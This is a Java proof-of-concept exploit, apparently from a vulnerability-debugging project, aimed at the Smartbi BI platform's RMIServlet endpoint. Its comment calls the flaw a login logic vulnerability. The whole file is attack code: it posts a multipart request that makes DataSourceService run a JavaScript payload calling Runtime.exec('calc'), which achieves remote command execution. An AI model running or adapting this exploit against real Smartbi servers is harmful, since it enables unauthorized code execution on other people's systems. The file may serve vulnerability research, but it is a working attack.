package cve;

import com.pacemrc.vuldebug.common.utils.HttpRequest;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

/**
 * 登陆逻辑漏洞
 */
public class PATCH_20230822 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:18080/smartbi/vision/RMIServlet?windowUnloading=&";
        String queryString;
        queryString = "className=UserService&methodName=checkVersion&params=[]";
        queryString = URLEncoder.encode(queryString,"UTF-8");

        HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();

        HttpHost proxy = new HttpHost("127.0.0.1",8080);
        RequestConfig config = RequestConfig.custom()
                .setProxy(proxy)
                .build();
        httpClientBuilder.setDefaultRequestConfig(config);
        HttpClient httpClient = httpClientBuilder.build();

        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create()
                .addPart("className", new StringBody("DataSourceService", ContentType.TEXT_PLAIN))
                .addPart("methodName", new StringBody("getJavaQueryDataParamsAndFields", ContentType.TEXT_PLAIN))
                .addPart("params",new StringBody("[\"smartbi.JavaScriptJavaQuery\",{\"javaScript\":\"importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('calc');\"},\"AP_WARNING_STYLE_SETTING\"]", ContentType.TEXT_PLAIN));
        HttpEntity multipartEntity = multipartEntityBuilder.build();

        HttpPost httpPost = new HttpPost(url + queryString);
        httpPost.setEntity(multipartEntity);

        HttpResponse response = httpClient.execute(httpPost);
        HttpEntity responseEntity = response.getEntity();
        String responseBody = responseEntity != null ? EntityUtils.toString(responseEntity, StandardCharsets.UTF_8) : null;

        System.out.println("Response status code: " + response.getStatusLine().getStatusCode());
        System.out.println("Response body: " + responseBody);
    }
}
